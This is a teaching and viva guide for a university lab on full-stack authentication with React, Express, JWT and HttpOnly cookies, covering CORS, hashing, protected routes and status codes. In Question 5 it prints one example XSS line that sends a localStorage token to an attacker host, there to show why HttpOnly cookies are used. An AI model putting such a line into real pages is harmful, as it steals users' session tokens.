# 🧑‍🏫 ShopKart TA Master Teaching & Viva Guide (Lab 02)

> **Audience**: Teaching Assistants (TAs), Instructors & Students  
> **Topic**: Full-Stack Authentication (React + Express + JWT + HttpOnly Cookies)  
> **Purpose**: A complete repository of conceptual and code-related questions to evaluate students during lab sessions, viva voce, and 1-on-1 code reviews.

---

## 📑 Table of Contents

1. [Connecting Frontend to Backend & Networking](#1-connecting-frontend-to-backend--networking)
2. [Authentication vs Authorization](#2-authentication-vs-authorization)
3. [HttpOnly Cookies vs LocalStorage (Security)](#3-httponly-cookies-vs-localstorage-security)
4. [React Concepts & Form Handling](#4-react-concepts--form-handling)
5. [JSON Web Tokens (JWT) Deep Dive](#5-json-web-tokens-jwt-deep-dive)
6. [Protected Routes & Navigation Flow](#6-protected-routes--navigation-flow)
7. [Password Hashing & Backend Security](#7-password-hashing--backend-security)
8. [Error Handling & Industry Standards](#8-error-handling--industry-standards)
9. [⚡ Rapid-Fire Viva Cheat Sheet (5-Minute Evaluation)](#9--rapid-fire-viva-cheat-sheet-5-minute-evaluation)

---

# 1. Connecting Frontend to Backend & Networking

### ❓ Question 1: "Why do we use an Axios instance instead of calling `axios.get('http://localhost:5001/...')` everywhere?"

#### 💡 Ideal Student Answer:
> *"Creating an Axios instance with `axios.create()` allows us to centralize our API configuration in one place—such as the `baseURL`, default headers, and `withCredentials: true`. If our server URL changes or we deploy to production, we only update one file (`services/api.js`) instead of modifying dozens of components."*

#### 💻 Code Snippet:
```javascript
// ❌ BAD: Hardcoding base URL in every component
// In Login.jsx:
axios.post("http://localhost:5001/customers/login", data, { withCredentials: true });
// In Home.jsx:
axios.get("http://localhost:5001/customers/me", { withCredentials: true });

// ✅ GOOD & INDUSTRY STANDARD: Centralized service (services/api.js)
import axios from "axios";

const api = axios.create({
  baseURL: "http://localhost:5001",
  withCredentials: true, // applied automatically to every request!
});

export default api;
```

---

### ❓ Question 2: "What is `withCredentials: true` and what happens if you forget it?"

#### 💡 Ideal Student Answer:
> *"By default, browsers do not attach cookies to cross-origin requests. `withCredentials: true` tells Axios and the browser to include our HttpOnly cookie (`token`) when sending requests to the backend, and to accept the `Set-Cookie` header sent by the server. If we forget it, requests to `/customers/me` will arrive at the backend without any cookie, causing a `401 Unauthorized` error every time."*

#### 🔍 Follow-Up Cross Question:
> **TA**: *"Does setting `withCredentials: true` on the frontend alone make it work?"*  
> **Student**: *"No! The backend Express server must also configure CORS with `credentials: true` and an explicit allowed origin (not `'*'`)."*

```javascript
// Backend (index.js):
app.use(cors({
  origin: "http://localhost:5173", // Must be specific, not wildcard '*'
  credentials: true                // Allows cookies to cross domains/ports
}));
```

---

### ❓ Question 3: "What is CORS and why does the browser block requests between port 5173 and 5001?"

#### 💡 Ideal Student Answer:
> *"CORS stands for Cross-Origin Resource Sharing. An origin is defined by Protocol + Domain + Port (`http://localhost:5173` vs `http://localhost:5001`). Even though both are on `localhost`, different ports mean different origins. The browser enforces the Same-Origin Policy for security. The backend must send headers like `Access-Control-Allow-Origin` to grant the frontend permission."*

---

# 2. Authentication vs Authorization

### ❓ Question 4: "What is the difference between Authentication and Authorization? Give a real-world example."

#### 💡 Ideal Student Answer:
> *"**Authentication** is answering: **Who are you?** (Verifying identity).  
> **Authorization** is answering: **What are you allowed to do?** (Verifying permissions)."*

#### 🏢 Real-World Analogy:
> - **Authentication**: Showing your passport at the airport security counter. It proves your identity.
> - **Authorization**: Your boarding pass showing you have a seat in *Economy*, not *First Class*. You are identified, but restricted from entering the First Class lounge.

#### 💻 Code Mapping:
```javascript
// 1. Authentication (routes/customer.routes.js):
// Checks if email + password match -> issues a JWT token.
router.post("/login", loginCustomer);

// 2. Authorization (middlewares/auth.middleware.js):
// Checks if the user holds a valid token before letting them access private data.
router.get("/me", authMiddleware, getMyProfile);
```

---

# 3. HttpOnly Cookies vs LocalStorage (Security)

### ❓ Question 5: "Why do we store the JWT in an `HttpOnly` cookie instead of `localStorage`?"

#### 💡 Ideal Student Answer:
> *"If we store a JWT in `localStorage`, it is accessible to any JavaScript running on the page via `localStorage.getItem('token')`. If a third-party npm package or an attacker injects malicious script (**XSS - Cross-Site Scripting**), they can steal the user's token.  
> With an **HttpOnly** cookie, the browser forbids client-side JavaScript from reading `document.cookie`. The browser sends it automatically in HTTP headers, making it immune to token theft via XSS."*

#### 💻 Code Comparison:
```javascript
// ❌ VULNERABLE: Token stored in localStorage
localStorage.setItem("token", response.data.token);
// An attacker running XSS can simply do:
fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));

// ✅ SECURE & INDUSTRY STANDARD: Set as HttpOnly by server
// Backend controller:
res.cookie("token", token, {
  httpOnly: true, // JS cannot read this!
  maxAge: 24 * 60 * 60 * 1000, // 1 day
  sameSite: "lax", // Protects against CSRF
});
```

---

### ❓ Question 6: "If JavaScript cannot read the HttpOnly cookie, how does React know what the customer's name is?"

#### 💡 Ideal Student Answer:
> *"React does not read the cookie directly! Instead, when the `/home` page mounts, React calls `GET /customers/me`. The browser automatically includes the HttpOnly cookie in the HTTP request. The backend verifies the token and responds with user data (`{ fullName, email, phone }`), which React stores in component state."*

---

# 4. React Concepts & Form Handling

### ❓ Question 7: "What is a 'Controlled Component' in React? Why do we use it in forms?"

#### 💡 Ideal Student Answer:
> *"A controlled component is an input element whose value is controlled by React state rather than the DOM. Its `value` is bound to a state variable, and every keystroke triggers an `onChange` handler that updates the state.  
> We use it because React becomes the 'single source of truth', making instant validation, conditional disabling, and form resetting easy and predictable."*

#### 💻 Code Snippet:
```jsx
// ✅ Controlled Component
const [email, setEmail] = useState("");

<input
  type="email"
  value={email}                       // 1. State drives the UI
  onChange={(e) => setEmail(e.target.value)} // 2. UI updates the State
/>
```

---

### ❓ Question 8: "Why should we validate form inputs on BOTH client and server?"

#### 💡 Ideal Student Answer:
> *"**Client-side validation** provides immediate user feedback (e.g. 'Password must be at least 6 characters') without waiting for a network roundtrip.  
> **Server-side validation** is mandatory for security because any attacker can bypass the frontend using Postman, curl, or browser dev tools."*

---

# 5. JSON Web Tokens (JWT) Deep Dive

### ❓ Question 9: "What are the three parts of a JWT? Can someone decode a JWT to read its data?"

#### 💡 Ideal Student Answer:
> *"A JWT consists of three parts separated by dots:  
> `Header.Payload.Signature`  
> 1. **Header**: Contains the token type (JWT) and algorithm (e.g. HS256).  
> 2. **Payload**: Contains claims/data (like user `id`, expiration time).  
> 3. **Signature**: Cryptographic hash created using `secret_key + header + payload`.  
>  
> **Yes! Anyone can decode the payload** because it is only Base64-encoded, not encrypted. Therefore, **we must NEVER store sensitive data like passwords inside the JWT payload!**"*

#### 🔍 Follow-Up Cross Question:
> **TA**: *"If anyone can read the payload, how does the server know it wasn't modified (e.g. changing userId to admin)?"*  
> **Student**: *"Because of the **Signature**! If someone changes even one character in the payload, the signature will not match when verified with the server's secret key (`jwt.verify`), and the server will reject it."*

---

# 6. Protected Routes & Navigation Flow

### ❓ Question 10: "Explain the lifecycle of what happens when a user navigates to `/home`."

```text
Browser enters /home
        │
        ▼
Is there a user profile in state?
        │
        ├── No ──> Show Loading Spinner
        │               │
        │               ▼
        │          api.get("/customers/me")
        │               │
        │         ┌─────┴─────┐
        │         ▼           ▼
        │     200 OK       401 Unauthorized
        │         │           │
        │         ▼           ▼
        │     Set State   navigate("/login")
        │         │
        └───> Render Profile Dashboard
```

#### 💻 Code Snippet:
```jsx
// Home.jsx:
useEffect(() => {
  const fetchUser = async () => {
    try {
      const res = await api.get("/customers/me");
      setProfile(res.data);
    } catch (err) {
      // 401 Unauthorized: Not logged in or expired session!
      navigate("/login");
    } finally {
      setLoading(false);
    }
  };
  fetchUser();
}, [navigate]);
```

---

# 7. Password Hashing & Backend Security

### ❓ Question 11: "Why do we use `bcrypt.hash(password, 10)`? What is the '10'?"

#### 💡 Ideal Student Answer:
> *"We never save plain text passwords because if the database leaks, all user accounts are compromised. `bcrypt` adds a random salt to the password before hashing it.  
> The number **10** is the **salt rounds** (work factor). It controls how many computational rounds are run ($2^{10} = 1024$ iterations). This deliberately slows down brute-force and rainbow table attacks."*

#### 💻 Code Snippet:
```javascript
// Register:
const hashedPassword = await bcrypt.hash(password, 10);
await Customer.create({ ...data, password: hashedPassword });

// Login:
const isMatch = await bcrypt.compare(password, customer.password);
if (!isMatch) {
  return res.status(401).json({ message: "Invalid email or password" });
}
```

---

### ❓ Question 12: "Why do we return the same message 'Invalid email or password' whether the email was wrong OR the password was wrong?"

#### 💡 Ideal Student Answer:
> *"This prevents **User Enumeration Attacks**. If we returned 'Email not found', an attacker could test email lists to discover which users have accounts on our platform. Using a generic message protects user privacy."*

---

# 8. Error Handling & Industry Standards

### ❓ Question 13: "What HTTP status codes should you use for authentication endpoints?"

| Status Code | Name | When to Use in ShopKart |
| :--- | :--- | :--- |
| **`200 OK`** | Success | Successful Login (`/login`) or Profile Fetch (`/me`) |
| **`201 Created`** | Created | Successful Registration (`/register`) |
| **`400 Bad Request`** | Client Error | Missing fields, password too short (<6 characters) |
| **`401 Unauthorized`** | Auth Failed | Invalid credentials, missing or expired cookie token |
| **`403 Forbidden`** | Forbidden | Valid identity, but lacking permission for this resource |
| **`409 Conflict`** | Conflict | Email already registered in database |
| **`500 Internal Error`** | Server Error | Unhandled exceptions, database connection failures |

---

### ❓ Question 14: "How does the Logout flow work step by step?"

#### 💡 Ideal Student Answer:
> *"1. The user clicks **Logout** in `Navbar.jsx`.  
> 2. Frontend calls `api.post("/customers/logout")`.  
> 3. The backend executes `res.clearCookie("token")`, instructing the browser to delete the cookie.  
> 4. Frontend resets its local React state (`setCustomer(null)`).  
> 5. React Router navigates the user to `/login`."*

```javascript
// Backend:
async function logoutCustomer(req, res) {
  res.clearCookie("token");
  return res.status(200).json({ success: true, message: "Logged out" });
}
```

---

# 9. ⚡ Rapid-Fire Viva Cheat Sheet (5-Minute Evaluation)

Use this quick checklist during student assessments:

1. **"What is the difference between `npm run dev` and `npm start` in Vite?"**  
   *Answer*: Vite's default dev command is `vite` (aliased to `dev`). We added `"start": "vite"` to `package.json` so both commands start the local development server.
2. **"Can we decode a JWT on `jwt.io` without knowing the secret key?"**  
   *Answer*: Yes, because the payload is just Base64Url-encoded. But we cannot create a *valid signature* without the secret key.
3. **"Where is the token stored in this project?"**  
   *Answer*: In an HttpOnly cookie managed by the browser.
4. **"What hook do you use to change pages programmatically in React Router v6?"**  
   *Answer*: `useNavigate()` (`const navigate = useNavigate(); navigate('/home')`).
5. **"Why is `useEffect` with an empty dependency array `[]` used in `/home`?"**  
   *Answer*: It ensures the API call to `/customers/me` runs only once when the component first mounts.
6. **"What does `select('-password')` do in Mongoose?"**  
   *Answer*: It excludes the hashed password field from the query result so it is never accidentally sent over the network to the client.
7. **"Why do we need proxy in `vite.config.js` or CORS in Express?"**  
   *Answer*: To bridge requests across different ports (`5173` to `5001`) without violating browser cross-origin security rules.
8. **"What will happen if a user manually changes the URL to `/home` while logged out?"**  
   *Answer*: `/home` executes `GET /customers/me`. Without the cookie, the backend returns 401, and the `catch` block calls `navigate("/login")`.
9. **"Why is `Customer.findOne({ email })` needed during registration?"**  
   *Answer*: To ensure email uniqueness and return a clean 409 Conflict instead of a database crash.
10. **"What does `res.cookie('token', token, { maxAge: 86400000 })` mean?"**  
    *Answer*: It sets cookie expiration to 24 hours (in milliseconds: $24 \times 60 \times 60 \times 1000$).
